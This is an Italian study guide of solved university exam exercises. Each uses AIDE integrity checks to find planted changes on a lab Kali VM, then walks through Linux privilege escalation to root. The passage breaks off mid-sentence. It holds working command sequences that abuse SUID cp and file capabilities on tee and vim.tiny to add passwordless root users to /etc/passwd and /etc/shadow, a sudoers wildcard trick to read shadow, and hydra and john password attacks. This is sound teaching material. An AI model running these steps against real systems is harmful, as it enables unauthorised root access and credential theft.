# Modello Risolto — Integrity Check & Privilege Escalation

> Fonte: `SIMULAZIONI ESAMI/SICINF/Integrity_check_e_privilege_escalation.html` (Virtuale), esercizio
> del **9 gennaio 2023**. Consegna, testo strategia e screenshot sono quelli reali della soluzione
> ufficiale.

---

## Consegna originale

> Scaricare il file `change1` e renderlo eseguibile (`chmod +x ./change1`). Il comando apporta una
> modifica a un file dentro `/usr/bin`.

**Fase 1**
- Ideare un modo di identificare il file modificato e il tipo di modifica apportata.
- Lanciare `sudo ./change1`.
- Attuare la strategia ideata per identificare il file modificato e il tipo di modifica.
- Documentare tutti i passi in modo dettagliato nel file `integrity.txt`.

**Fase 2** — catturare i comandi seguenti e l'output in uno screenshot `privesc.png`:
- Usare, come utente `kali` **senza sudo**, il file modificato da `change1` per inserire in
  `/etc/passwd` ed `/etc/shadow` le righe che "creano" un utente `toor` con privilegi di root e
  senza password.
- Diventare `toor` e lanciare `id`.

---

## Soluzione modello

### Fase 1 — Strategia e identificazione

```
STRATEGIA:
1. Configurare AIDE per una scansione accurata di qualsiasi modifica
   apportata dentro il sottoalbero /usr/bin (in /etc/aide/aide.conf,
   verificare/aggiungere una regola tipo "/usr/bin f+p+u+g+s+m+c+md5+sha256").
2. Creare il database di riferimento SUL SISTEMA PULITO, prima di
   eseguire change1: sudo aideinit (o aide --init, poi copiare
   aide.db.new.gz in aide.db.gz).
3. Lanciare sudo ./change1
4. Rilanciare AIDE in modalità confronto:
   sudo aide -C -c /etc/aide/aide.conf

RISULTATO: il confronto rileva che /usr/bin/cp ha ora il bit SUID
impostato (i permessi passano da -rwxr-xr-x a -rwsr-xr-x — la "s"
al posto della "x" nel bit di esecuzione utente indica il SUID).
Questo è il file modificato e il tipo di modifica.
```

**Perché questa strategia e non un'altra**: AIDE per default a volte non copre `/usr/bin` in modalità
"Full" (dipende dal preset del pacchetto), quindi va **verificato/esplicitato** nel file di config
prima di creare il database — altrimenti il confronto post-modifica non rileva nulla lì. Il principio
generale (uguale per tutti gli esercizi di questa famiglia, S7/S9/S11): database "pulito" **prima**
della modifica, poi confronto **dopo**, mai il contrario.

### Fase 2 — Privilege escalation via SUID su `cp`

```
cp /etc/passwd ~/p
cp /etc/shadow ~/s
cat ~/p > ~/passwd
cat ~/s > ~/shadow
echo "toor:x:0:0::/root:/bin/bash" >> ~/passwd
echo "toor::19509:0:99999:7:::" >> ~/shadow
cp ~/passwd /etc/passwd
cp ~/shadow /etc/shadow
su toor
id
```

`privesc.png` (screenshot reale — trascrizione):
```
vagrant@client:~$ cp /etc/passwd ~/p
vagrant@client:~$ cp /etc/shadow ~/s
vagrant@client:~$ cat ~/p  > ~/passwd
vagrant@client:~$ cat ~/s > ~/shadow
vagrant@client:~$ ls -l
total 16
-rw-r--r-- 1 root     vagrant 1503 Jun  2 02:29 p
-rw-r--r-- 1 vagrant  vagrant 1503 Jun  2 02:30 passwd
-rw-r----- 1 root     vagrant  864 Jun  2 02:29 s
-rw-r--r-- 1 vagrant  vagrant  864 Jun  2 02:30 shadow
vagrant@client:~$ echo "toor:x:0:0::/root:/bin/bash" >> ~/passwd
vagrant@client:~$ echo "toor::19509:0:99999:7:::" >> ~/shadow
vagrant@client:~$ grep toor *
passwd:toor:x:0:0::/root:/bin/bash
shadow:toor::19509:0:99999:7:::
vagrant@client:~$ cp ~/passwd /etc/passwd
vagrant@client:~$ cp ~/shadow /etc/shadow
vagrant@client:~$ su toor
root@client:/home/vagrant# id
uid=0(root) gid=0(root) groups=0(root)
root@client:/home/vagrant#
```

---

## Perché funziona (meccanismo, non solo comandi)

`cp` con il bit **SUID** attivo viene eseguito sempre con i privilegi del **proprietario del file**
(root), indipendentemente da chi lo lancia. Un utente normale non ha permessi di scrittura diretta su
`/etc/passwd`/`/etc/shadow` (o su shadow addirittura non ha permessi di lettura), ma se usa `cp` per
scriverci sopra, la scrittura avviene **come root**, perché è `cp` — non l'utente — ad avere i
privilegi effettivi durante l'esecuzione.

La sequenza quindi: copia i file originali in una directory scrivibile dall'utente (`~/p`, `~/s`),
li duplica in file modificabili (`~/passwd`, `~/shadow`), vi appende una riga utente con **UID/GID
0** (root) e **campo password vuoto in shadow** (nessuna password richiesta per il login), poi
ricopia questi file modificati sopra gli originali — usando di nuovo `cp`, che grazie al SUID ha i
permessi per farlo anche se l'utente `kali`/`vagrant` normalmente non li avrebbe.

Questo è l'esempio più semplice della famiglia; le varianti successive (change2...change9) modificano
binari diversi con tecniche diverse (capabilities, ACL, ecc. — vedi febbraio 2025 nello stesso file
per un esempio con `getcap`/`getfacl`/`hydra`), ma il principio resta: **AIDE per identificare cosa
è cambiato, poi ragionare su come quella specifica modifica dia un vantaggio di privilegio**.

---

## 15 giugno 2023 — `change2` (soluzione ufficiale non allegata: ricostruita per analisi statica)

> Fonte: stesso HTML, cap. 2. **Attenzione**: per questo esercizio nel libro Moodle **non è
> allegata alcuna soluzione ufficiale** (nessun link "SOLUZIONE", solo il binario `change2`
> scaricabile). Quanto segue è **ricostruito da analisi statica del binario** (`strings`,
> `objdump -d`), non da un write-up del docente: il vettore reale è certo (deriva dal codice del
> binario), i comandi di exploit sono l'inferenza standard della famiglia, non una trascrizione.

### Consegna originale

> Scaricare `change2`, `chmod +x ./change2`. Il comando modifica file dentro `/usr/bin` e `/etc`.
> **Fase 1**: ideare un modo di identificare file e tipo di modifica, `sudo ./change2`, attuare la
> strategia, documentare in `integrity.txt`. **Fase 2** (`privesc.png`): usare **come utente `kali`
> senza sudo** il/i file modificato/i per inserire in `/etc/passwd` e `/etc/shadow` le righe che
> "creano" un utente `toor` con privilegi di root e **senza password**; diventare `toor` e `id`.

### Cosa fa davvero `change2` (dall'analisi del binario)

`change2` è linkato a `libcap` e `libacl` e nel `main` esegue in sequenza (indirizzi da `objdump -d`):

1. `newaclfake("user:prandini:rwx", "/etc/passwd")`
2. `newaclfake("user:prandini:rwx", "/etc/shadow")`
3. `mycapset("cap_dac_override=ep", "/usr/bin/vim.tiny")`
4. `mycapfake("cap_dac_override=ep", "/usr/bin/cp")`
5. `mycapfake("cap_dac_override=ep", "/usr/bin/tee")`

Le funzioni con `fake` nel nome **applicano la modifica e poi la ripristinano** nello stesso
processo: `mycapfake` chiama `mycapset` (imposta la capability) e subito dopo `mycapres`
(`cap_clear` + `cap_set_file`, la azzera); `newaclfake` chiama `acl_set_file` due volte (la
seconda ripristina l'ACL originale salvato). Effetto netto: `cp`, `tee`, `/etc/passwd` e
`/etc/shadow` **tornano com'erano** (a parte il `Ctime`, che cambia comunque). L'**unica modifica
persistente** è quella applicata da `mycapset` (una sola `cap_set_file`, senza ripristino):
`/usr/bin/vim.tiny` ottiene realmente `cap_dac_override=ep`. Le funzioni `newaclmod`/`myaddacl`
esistono nel binario ma **non sono chiamate** dal `main`.

Conseguenza pratica per la Fase 1: nel confronto AIDE (regola `/usr/bin f Full` + `/etc f Full`)
solo `/usr/bin/vim.tiny` mostra una capability nuova (`XAttrs num=0 → num=1`); `cp`/`tee`/
`passwd`/`shadow` compaiono al più con variazioni di solo `Ctime` — sono i vicoli ciechi
deliberati. `getcap /usr/bin/vim.tiny` conferma `cap_dac_override=eip`.

### Fase 2 — exploit inferito (identico per meccanismo a 12 gennaio 2026)

```
vim.tiny /etc/passwd
# aggiungere in fondo:  toor::0:0::/root:/bin/bash   (secondo campo VUOTO = nessuna password)
:w!                    # vim.tiny avvisa che il file non è scrivibile: forzare — la cap bypassa il DAC
su toor
id                     # uid=0(root)
```

### Perché funziona

`cap_dac_override` su `vim.tiny` permette all'editor di **scrivere qualunque file** ignorando i
permessi Unix, chiunque lo lanci; l'utente `kali` non ha permesso di scrittura su `/etc/passwd`,
ma `vim.tiny` sì. La riga `toor::0:0::/root:/bin/bash` ha **UID/GID 0** (root) e **campo password
vuoto** — per la semantica classica "nessuna password richiesta", quindi `su toor` concede subito
la shell root. È lo stesso identico meccanismo del caso 12 gennaio 2026: lì la capability era
inserita da un pacchetto `.deb`, qui direttamente dal binario `change2`. La differenza didattica
utile: i vicoli ciechi qui sono "invisibili ad AIDE" perché ripristinati, mentre in altri
esercizi (11 gen 2024, feb 2025) restano nel diff ma sono inutilizzabili — due modi diversi in cui
un pacchetto realistico maschera il vettore vero.

---

## 11 gennaio 2024 — `change4` (capability `cap_dac_override` su `tee`)

> Fonte: cap. 3, con soluzione ufficiale allegata: testo `integrity.txt` + screenshot (Mousepad).

### Consegna originale

> `change4`, modifiche in `/usr/bin` e `/etc`. Fase 1: identificare file e modifica, documentare in
> `integrity.txt`. Fase 2 (`privesc.png`): come `kali` **senza sudo**, usare il/i file modificato/i
> per creare in `/etc/passwd` e `/etc/shadow` un utente `hack` con privilegi di root e **password
> `hack`**; diventare `hack` e `id`.

### Fase 1 — diff AIDE e triage

Il confronto AIDE segnala modifiche a quattro file (trascrizione dall'`integrity.txt` ufficiale):
`/etc/sudoers` (ACL), `/usr/bin/grep` (capabilities), `/usr/bin/tee` (capabilities),
`/usr/bin/vim.tiny` (rimozione del diritto di scrittura utente). **Tre su quattro non sono
sfruttabili**; l'unico file utilizzabile è `/usr/bin/tee`, dotato di `cap_dac_override`.

### Fase 2 — exploit (trascrizione dello screenshot ufficiale)

```
cat /etc/passwd > /tmp/passwd
openssl passwd -1 -salt hack hack > new_entry      # → $1$hack$xR6zsfvpez/t8teGRRSNr.
# comporre la riga:  hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/bin/bash
cat new_entry >> /tmp/passwd
cat /tmp/passwd | tee /etc/passwd                  # tee ha cap_dac_override → scrive /etc/passwd
su hack                                             # Password: hack
whoami                                              # root
```

> ⚠️ **Refuso nella trascrizione ufficiale.** La riga `hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/bin/bash`
> ha **solo 6 campi** (manca la home directory). Il formato di `/etc/passwd` è a **7 campi**:
> `utente:password:UID:GID:GECOS:home:shell`. La riga corretta e ben formata è
> `hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/root:/bin/bash` (GECOS=`root`, home=`/root`,
> shell=`/bin/bash`). Non ricopiare ciecamente la versione a 6 campi: con un campo mancante i valori
> slittano (home diventa `/bin/bash`, shell vuota) e `su hack` può comportarsi in modo imprevedibile.
> Vedi `guida_esame_privesc.md` §4.3.

> Nota fonte: l'`integrity.txt` ufficiale descrive una variante che scrive **anche** `/etc/shadow`
> (hash `openssl passwd -6 -salt ... hack` appeso con `tee -a /etc/shadow`); lo **screenshot**
> allegato mostra invece la via più semplice effettivamente eseguita — hash **inline nel secondo
> campo di `/etc/passwd`**, senza toccare shadow. Entrambe valide; qui si riporta quella dello
> screenshot perché è quella catturata come prova.

### Perché funziona

`tee` con `cap_dac_override` scrive `/etc/passwd` scavalcando i permessi. Il formato storico di
`/etc/passwd` ammette l'**hash direttamente nel secondo campo** (dove oggi c'è la `x` che rimanda a
shadow): mettendo `$1$hack$…` con UID/GID 0 si crea un account root la cui password (`hack`) è
verificata contro quell'hash MD5-crypt. `tee` è il vettore giusto perché è l'unico dei quattro file
segnalati con una capability *effettiva* e *utile* (scrivere file): `grep` e `vim.tiny` sono rumore.

---

## 8 febbraio 2024 — `change5` (capability `cap_fowner` su `chmod` → SUID `cp`)

> Fonte: cap. 4, soluzione ufficiale: testo `integrity.txt` + screenshot.

### Consegna originale

> `change5`, modifiche in `/usr/bin` e `/etc`. Fase 1 come sopra (`integrity.txt`). Fase 2
> (`privesc.png`): come `kali` **senza sudo**, creare in `/etc/passwd` e `/etc/shadow` un utente
> `toor` con privilegi di root e **password `gotRoot`**; diventare `toor` e `id`.

### Fase 1 — diff AIDE

Modifiche segnalate (trascrizione dall'`integrity.txt` ufficiale):

```
File: /etc/passwd    Ctime cambiato
File: /etc/shadow    Perm -rw-r----- → -rw-------   (+ Ctime)
File: /usr/bin/chmod XAttrs num=0 → num=1  (security.capability)
File: /usr/bin/tail  XAttrs num=0 → num=1  (security.capability)
```

Verifica puntuale: `getcap` mostra `/usr/bin/chmod cap_fowner=ep`; `/usr/bin/tail` non ha
capability effettiva (`=`, vuota). **Solo `chmod` è utile.**

### Fase 2 — exploit (trascrizione integrity.txt + screenshot)

```
chmod u+s /usr/bin/cp                # chmod (CAP_FOWNER) setta il SUID su cp anche se non ne è proprietario
ls -la /usr/bin/cp                   # -rwsr-xr-x 1 root root ... /usr/bin/cp
cp /etc/passwd tempPasswd
featherpad tempPasswd                # aggiungere: toor:$1$kll9aWJ6$qMNag9wCNqcKs8CgGSE3t.:0:0:root:/root:/usr/bin/zsh
openssl passwd gotRoot               # → $1$kll9aWJ6$qMNag9wCNqcKs8CgGSE3t.  (senza -salt: salt casuale)
cp tempPasswd /etc/passwd            # cp ora è SUID-root → sovrascrive il file protetto
su toor                              # Password: gotRoot
# root@kali
```

### Perché funziona

Chain di **due** vettori. `CAP_FOWNER` significa "ignora il controllo che di norma consente di
cambiare permessi solo al proprietario del file": `chmod` con questa capability può settare il bit
**SUID** su `/usr/bin/cp` (di proprietà di root) pur essendo lanciato da `kali`. Da quel momento
`cp` è un secondo vettore SUID (come nel caso 9 gennaio 2023): eseguito da chiunque, gira come
root, quindi `cp tempPasswd /etc/passwd` sovrascrive il file protetto. L'hash MD5-crypt di
`gotRoot` è messo inline nel secondo campo passwd, UID/GID 0. Lezione: una capability non
direttamente utile a scrivere `/etc/passwd` può comunque **fabbricare** il vettore che serve
(qui: caps → SUID → overwrite).

---

## 13 giugno 2024 — `change_2024_06_13` (utente senza password + ACL su `/etc/sudoers`)

> Fonte: cap. 5, soluzione ufficiale: testo `integrity.txt` + screenshot. La consegna qui **non**
> nomina `toor`/password: chiede solo di **diventare root senza usare il "potere sudo" di `kali`**.

### Consegna originale

> `change_2024_06_13` (consigliata VM Kali mai alterata), modifiche in `/usr/bin` e `/etc`. Fase 1:
> identificare file e modifica. Fase 2: **senza ricorrere al "potere sudo" dell'utente `kali`** (gli
> altri usi derivanti dalle modifiche sono consentiti), diventare root e lanciare `id`. Documentare
> in `integrity.txt`, screenshot `privesc.png`.

### Fase 1 — diff AIDE (5 modifiche, trascrizione ufficiale)

```
f = p.. .c .. .   : /etc/crontab      Perm -rw-r--r-- → -rw-rw----
f > ... mc .H .   : /etc/passwd       (contenuto cambiato)
f = p.. .c .. .   : /etc/sudoers      Perm -r--r----- → -r--rw----   (ACL modificata)
f = ... .c .. X   : /usr/bin/tee      XAttrs: capability aggiunta
f = ... .c .. .   : /usr/bin/vim.basic (solo Ctime)
```

Triage (dall'`integrity.txt`): permessi di `/etc/crontab` **ininfluenti**; `vim.basic` solo
timestamp; `tee` è un **falso positivo** (nessuna capability effettiva). Le due modifiche vere:
in `/etc/passwd` un nuovo utente senza password `intruso::1202:1000::/tmp:/bin/bash`; l'ACL di
`/etc/sudoers` modificata per consentire la **scrittura** all'utente `intruso`.

### Fase 2 — exploit

```
su intruso                                           # nessuna password
echo 'intruso    ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers   # l'ACL consente a intruso di scrivere sudoers
sudo -i                                              # intruso è ora sudoer pieno → root
```

Lo screenshot conferma: `su intruso` / `su - intruso`, editing di `/etc/sudoers` (`nano`), poi
`sudo su` → `root@kali`.

### Perché funziona

Nessun SUID né capability: il vettore è puramente **passwd + ACL + sudoers**. L'utente `intruso`
ha il secondo campo passwd vuoto → login libero (`su intruso` non chiede password). L'ACL POSIX
`user:intruso:rw` su `/etc/sudoers` gli dà il permesso di **scrivere** quel file (che i permessi
Unix riserverebbero a root) — così `intruso` si concede una riga sudo onnipotente e poi `sudo -i`
diventa root. È il caso "catena sociale" della famiglia: si sfruttano configurazioni di sistema,
non binari privilegiati.

---

## febbraio 2025 — `change-2025-02-13` (ACL + sudoers + brute-force SSH con hydra)

> Fonte: cap. 6, soluzione ufficiale **inline nel testo** (in rosso, "SOLUZIONE SOTTO"). Consegna:
> diventare root senza il potere sudo di `kali`. È il caso citato dagli altri modelli per
> `getcap`/`getfacl`/`hydra`.

### Fase 1 — diff AIDE (7 modifiche, trascrizione ufficiale)

```
f > ... mc .H .   : /etc/group        (contenuto)
f > ... mc .H .   : /etc/passwd       (contenuto)
f > ... mc .H .   : /etc/shadow       (contenuto)
f > ... mc .H .   : /etc/sudoers      (contenuto)
f = ... .c .. X + : /usr/bin/chmod    capability
f = ... .c .. X + : /usr/bin/date     capability
f = p.. .c .A .   : /usr/bin/tee      ACL
```

Analisi puntuale con i comandi specifici (trascrizione ufficiale):

```
getcap /usr/bin/chmod   → (vuoto: falso positivo)
getcap /usr/bin/date    → cap_audit_read=ep   (modifica vera ma inutile: legge solo i log di audit)
getfacl /usr/bin/tee    → user:spy:rw-         (spy può modificare tee, ma tee non ha privilegi speciali)
grep spy /etc/passwd    → spy:x:5243:5243::/tmp:/bin/bash   (protetto da password, hash non accessibile)
```

Tutte le modifiche ai binari sono vicoli ciechi. Il vettore reale è l'utente `spy` +
`/etc/sudoers`, ma la password di `spy` non è ricavabile offline (nessun accesso all'hash).

### Fase 2 — exploit (brute-force online + sudoers)

```
hydra -l spy -P /usr/share/wordlists/rockyou.txt ssh://localhost   # → login: spy  password: qwerty
su - spy                                                            # Password: qwerty
sudo -l          # → (root) NOPASSWD: /usr/bin/tee
echo "toor::0:0::/root:/bin/bash" | sudo /usr/bin/tee -a /etc/passwd
su - toor
id               # uid=0(root) gid=0(root) groups=0(root)
```

### Perché funziona

Il vettore non è nei binari (tutti falsi positivi o capability inutili) ma nella combinazione
**utente con password + regola sudoers permissiva**: `spy` può eseguire `tee` come root senza
password (`NOPASSWD: /usr/bin/tee`). Poiché l'hash di `spy` non è leggibile offline, la password si
ottiene **online** con `hydra` (attacco a dizionario su SSH, `rockyou.txt`) — è l'unico esercizio
del pool che richiede un brute-force *online* invece di `john` offline, proprio perché shadow non è
accessibile. Ottenuto `spy`, `sudo tee` scrive come root una riga passwd UID-0 senza password.
L'ACL `user:spy:rw` su `tee` è un depistaggio che indica *chi* è l'utente da attaccare ma è di per
sé inutile (tee senza sudo non ha alcun privilegio).

---

## 10 luglio 2025 — pacchetto `.deb` (first senza password → john su next → CAP_FOWNER chmod)

> Fonte: cap. 7, soluzione ufficiale: ZIP con `integrity.txt` + 7 screenshot. Primo caso della
> famiglia consegnato come **pacchetto Debian** invece che binario `change`.

### Consegna originale

> Scaricare `esame_2025.07.10_all.deb.gz`. Il pacchetto modifica file in `/usr/bin` e `/etc` (più
> altri deducibili). Fase 1: predisporre l'identificazione, `gunzip`, `sudo dpkg -i
> esame_2025.07.10_all.deb`, attuare la strategia. Fase 2: **senza il potere sudo di `kali`**,
> diventare root e `id`. `integrity.txt` + `privesc.png`.

### Fase 1 — setup e diff AIDE

Config AIDE (trascrizione ufficiale): commentare `@@x_include /etc/aide/aide.conf.d …`, aggiungere
`/usr/bin f Full` e `/etc/ f Full`; `sudo aideinit`; installare; `sudo aide -C -c /etc/aide/aide.conf`.
Diff (7 changed): `/etc/group`, `/etc/gshadow`, `/etc/passwd`, `/etc/shadow` (contenuto; su shadow
anche **ACL**), `/usr/bin/chmod` (perm + gid + capability), `/usr/bin/sort` (capability),
`/usr/bin/yes` (SUID: `-rwxr-xr-x → -rwsr-xr-x`).

Analisi (trascrizione ufficiale):
- Due nuovi utenti: `first::1001:1001::/tmp:/bin/bash` (**senza password**) e
  `next:x:1002:1002::/tmp:/bin/bash`.
- ACL su `/etc/shadow`: `user:first:r--` → **`first` può leggere shadow**.
- `sort` ha `CAP_MKNOD` (creare device file: non immediatamente utilizzabile).
- `yes` ha il SUID (ma produce solo stringhe su stdout: inutile come root).
- `chmod` ha `CAP_FOWNER`, con permessi ristretti a root e al gruppo `next`.

### Fase 2 — exploit (trascrizione integrity.txt + privesc7/8.png)

```
su - first                                              # senza password
unshadow /etc/passwd /etc/shadow > /tmp/temporaneo      # first legge shadow grazie all'ACL
john -format=crypt -wordlist=/usr/share/wordlists/rockyou.txt /tmp/temporaneo   # → next: alejandro
su - next                                               # Password: alejandro
chmod 0777 /etc/passwd                                  # next può usare chmod (CAP_FOWNER): passwd scrivibile
vim /etc/passwd                                         # rimuovere la x da root:  root::0:0:...
su root                                                 # nessuna password → root
id                                                      # uid=0(root) gid=0(root) groups=0(root)
```

### Perché funziona

Catena di quattro anelli: (1) `first` senza password = punto d'appoggio gratuito; (2) l'ACL
`user:first:r--` su shadow permette a `first` di leggere gli hash normalmente riservati a root; (3)
`john` cracca offline la password di `next` (`alejandro`) da shadow; (4) `next` è abilitato a
eseguire `chmod` che ha `CAP_FOWNER`, quindi rende `/etc/passwd` scrivibile e si toglie la `x` di
root (root senza password) → `su root`. Depistaggi: `sort` (CAP_MKNOD) e `yes` (SUID) sono
privilegi reali ma inutilizzabili. L'`integrity.txt` elenca anche strategie alternative (scrivere
`/etc/sudoers`, aggiungere `first` al gruppo `sudo`, cambiare l'UID) — lo screenshot mostra la via
più diretta (chmod passwd + edit di root).

---

## 30 ottobre 2025 — pacchetto `.deb.gpg` (searcher senza password → wildcard sudoers → john → vim.tiny)

> Fonte: cap. 8, soluzione ufficiale: tar.gz con `integrity.txt` + 4 screenshot. È la catena più
> ricca del pool: quattro vettori concatenati, incluso l'abuso di una **wildcard in sudoers**.

### Consegna originale

> `esame_2025.10.30_all.deb.gpg`. Fase 1: predisporre l'identificazione, decifrare
> (`gpg -d … > e.deb`), `sudo dpkg -i e.deb`, attuare la strategia. Fase 2: **senza il potere sudo
> di `kali`**, diventare root e `id`. `integrity.txt` + `privesc.png`.

### Fase 1 — diff AIDE

Config AIDE come sopra (`/etc f Full`, `/usr/bin f Full`, `@@x_include` commentato, `aideinit`,
`gpg -d`, `dpkg -i`, `aide -C`). Diff (1 aggiunto + 8 changed, trascrizione ufficiale):

```
ADDED:   /etc/sudoers.d/searcher
CHANGED: /etc/group /etc/gshadow /etc/passwd /etc/shadow
         /usr/bin/chmod (ACL)  /usr/bin/stdbuf (SUID)  /usr/bin/vim.tiny (cap + gid)  /usr/bin/whoami (cap)
```

Contenuto del nuovo file sudoers (leggibile):
`searcher    ALL=(root) NOPASSWD: /usr/bin/find /etc/passwd -exec cat *`

Nuovi utenti: `searcher::11110:11110:Look and ya shall find:/tmp:/bin/bash` (**senza password**) e
`wbr:x:11111:11111:wannaberoot:/home/wbr:/bin/bash`. `getcap`: `vim.tiny cap_dac_override=eip`,
`whoami cap_mknod=eip`. `vim.tiny` eseguibile solo dal gruppo `wbr`. Vicoli ciechi: `stdbuf` (SUID
ma inutile), `whoami` (cap_mknod inutile), `chmod` (ACL `user:wbr:rw` ma `chmod` senza privilegi
speciali).

### Fase 2 — exploit (trascrizione integrity.txt + privesc4.png)

```
su searcher                                                        # senza password
grep wbr /etc/passwd > p
sudo /usr/bin/find /etc/passwd -exec cat /etc/shadow \; | grep wbr > s   # WILDCARD abuse: cat /etc/shadow come root
unshadow p s > wbr
john -format=crypt -wordlist=/usr/share/wordlists/rockyou.txt wbr  # → wbr: estrellas
su - wbr                                                           # Password: estrellas
vim.tiny /etc/passwd                                               # cap_dac_override → mette UID di searcher a 0
su searcher                                                        # searcher è ora UID 0 e senza password → root
# root@kali:/home/wbr#
```

### Perché funziona

Quattro anelli. (1) `searcher` senza password. (2) **Abuso della wildcard in sudoers**: la regola
consente `/usr/bin/find /etc/passwd -exec cat *`; il `*` finale lascia a `searcher` la libertà di
mettere **qualsiasi argomento** dopo `cat`, quindi `find … -exec cat /etc/shadow \;` esegue
`cat /etc/shadow` **come root** ed esfiltra l'hash (questo è il trucco distintivo dell'esercizio:
una regola sudoers apparentemente innocua diventa lettura arbitraria per la wildcard). (3) `john`
cracca `wbr` (`estrellas`) offline. (4) `vim.tiny` ha `cap_dac_override` ed è eseguibile come
gruppo `wbr`: `wbr` lo usa per editare `/etc/passwd` e mettere **l'UID di `searcher` a 0**; poiché
`searcher` non ha password, `su searcher` apre subito una shell root. Depistaggi: `stdbuf` (SUID),
`whoami` (cap_mknod), `chmod` (ACL). Meccanismo condiviso col caso 12 gennaio 2026 (cap_dac_override
+ vim.tiny), ma qui l'obiettivo dell'edit è **cambiare un UID a 0** anziché svuotare il campo
password di root.

---

## Secondo caso: pacchetto malevolo con più modifiche — solo alcune sfruttabili (12 gennaio 2026)

> Fonte: stesso HTML, esercizio 9 "esercizio 12 gennaio 2026" (prova d'esame passata più recente
> al 09/07/2026, stessa giornata d'esame di `trace-2026-01-12.pcapng` in NIDS). Soluzione ufficiale
> del prof recuperata dall'allegato "Soluzione" nascosto nella pagina (tarball `privesc`, con
> `integrity.txt` + 3 screenshot reali).

### Consegna originale

> Scaricare `esame_2026.01.12_all.deb.gpg` sulla VM Kali (usare una VM mai alterata da esercizi
> precedenti). Il pacchetto modifica file/directory dentro `/etc` e `/usr/bin`, più eventualmente
> altre da dedurre. **Parte 1**: decifrare (`gpg -d esame_2026.01.12_all.deb.gpg > e.deb`, password
> `esame`), installare (`sudo dpkg -i e.deb`), identificare cosa è cambiato. **Parte 2**: **senza
> usare il potere sudo dell'utente kali**, diventare root e lanciare `id`. Documentare tutto in
> `integrity.txt`, catturare screenshot del successo in `privesc.png` (o `privesc1.png`, `2`, `3`...).

Diversa dal primo caso in un punto importante: qui il pacchetto introduce **più modifiche
contemporaneamente**, e non tutte sono sfruttabili — parte dell'esercizio è proprio distinguere
il vettore reale dai vicoli ciechi.

### Fase 1 — Setup AIDE e installazione del pacchetto

```
sudo nano /etc/aide/aide.conf     # in fondo al file, aggiungere:
/usr/bin f Full
/etc f Full

sudo aideinit --config /etc/aide/aide.conf
sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db   # database "pulito" PRIMA della modifica
sudo aide --check --config /etc/aide/aide.conf            # baseline: nessuna differenza attesa

gpg -d esame_2026.01.12_all.deb.gpg > e.deb
sudo dpkg -i e.deb                                         # il "pacchetto malevolo"

sudo aide --check --config /etc/aide/aide.conf             # confronto: qui emergono le modifiche
```

### Fase 2 — Leggere il diff di AIDE: 4 modifiche, solo 1 sfruttabile

AIDE segnala un file **aggiunto** e 14 **modificati**. Smontarli uno per uno (esattamente il
lavoro richiesto dalla Parte 1):

1. **`/etc/backup/id_guest` (nuovo file)** — `file /etc/backup/id_guest` rivela `OpenSSH private
   key`. Una chiave privata lasciata leggibile è di per sé un vettore: chiunque la legga può
   autenticarsi come il suo proprietario.
2. **`/etc/passwd`, `/etc/group`, `/etc/shadow` (+ backup `-`) modificati** — leggendo i file
   pubblicamente accessibili (`passwd`, `group`) si scopre la riga aggiunta:
   `guest:x:1004:1004::/home/guest:/bin/sh` — un nuovo utente `guest`, verosimilmente il
   proprietario della chiave trovata al punto 1.
3. **ACL su `/usr/bin/mknod` modificata** — `getfacl` mostra `user:guest:rwx`: `guest` ha pieno
   controllo del binario. **Vicolo cieco**: `mknod` (creare device file) non è un binario con
   privilegi speciali di suo — controllarlo non dà nulla in più.
4. **SGID su `/etc/timidity/` aggiunto** — la directory guadagna il bit SGID per il gruppo
   `root`. **Vicolo cieco**: il bit ha effetto solo sui file creati *dai membri del gruppo root*
   dentro quella directory — `guest` non ne fa parte, non se ne fa nulla.
5. **Capability su `/usr/bin/vim.tiny` aggiunta** — `getcap` mostra `cap_dac_override=eip`, e i
   permessi sono `----rwx--- root:guest` (eseguibile solo dal gruppo `guest`). **Questo è il
   vettore reale** — vedi sotto perché.

Il punto pedagogico: un pacchetto malevolo realistico non lascia *una* backdoor pulita, ne lascia
diverse, alcune vere e alcune rumore. AIDE le trova tutte indiscriminatamente — il ragionamento
su quale sia sfruttabile è lavoro umano, non automatizzabile dal tool.

### Fase 3 — Exploit in due passi (senza mai usare sudo)

**Passo A — usare la chiave trovata per diventare `guest`:**
```
cp /etc/backup/id_guest .
chmod 400 id_guest
ssh -i id_guest guest@localhost
```
Successo (`privesc_1.png`): login come `guest` via SSH, nessun uso di `sudo`.

**Passo B — sfruttare la capability di `vim.tiny` per riscrivere `/etc/passwd`:**
```
guest@parrot:~$ vim.tiny /etc/passwd
# rimuovere la "x" dalla riga di root:  root:x:0:0:root:/root:/bin/bash → root::0:0:...
# vim.tiny avvisa che il file sembra non scrivibile, ma forzare comunque:
:w!
guest@parrot:~$ su -
#id
uid=0(root) gid=0(root) groups=0(root)
```
Successo (`privesc_2.png`: il salvataggio forzato con "x" rimossa; `privesc_3.png`: `su -` seguito
da `id` come root).

### Perché funziona (meccanismo, non solo comandi)

**La capability `cap_dac_override`** è il cuore dell'exploit, e va capita bene perché è una
famiglia di privesc a sé (diversa da SUID, diversa da ACL, diversa da sudoers). Normalmente ogni
processo, anche se lanciato da root, è comunque soggetto ai controlli DAC (Discretionary Access
Control — i classici permessi `rwx` su file/directory) quando root non ha già i privilegi via
UID 0. Le *capabilities* Linux spacchettano "cosa può fare root" in decine di permessi granulari
assegnabili a un binario **senza renderlo SUID-root** — `cap_dac_override` specificamente è il
permesso "ignora i controlli di permesso in lettura/scrittura sui file, chiunque sia il processo
che mi esegue". Un editor con questa capability attiva può aprire e scrivere **qualunque file**,
indipendentemente da chi lo lancia e da cosa dicono i permessi Unix del file — è esattamente
perché `vim.tiny`, eseguito da `guest` (che non avrebbe alcun permesso di scrittura su
`/etc/passwd`), riesce comunque a salvare la modifica con `:w!`.

**Perché rimuovere la "x" da `/etc/passwd` basta per diventare root senza password**: il formato
storico di `/etc/passwd` è `utente:password:uid:gid:...` — oggi il campo password contiene sempre
`x` (segnaposto che dice "la password vera è in `/etc/shadow`, cifrata"). Se quel campo è **vuoto**
invece di contenere `x` o un hash, per la semantica classica del sistema di autenticazine
significa "nessuna password richiesta" per quell'utente — `su -` verso `root` con il campo password
vuoto non chiede nulla e concede la shell root immediatamente.

**Perché i vicoli ciechi (mknod, timidity) sono deliberatamente nel diff**: insegnano a
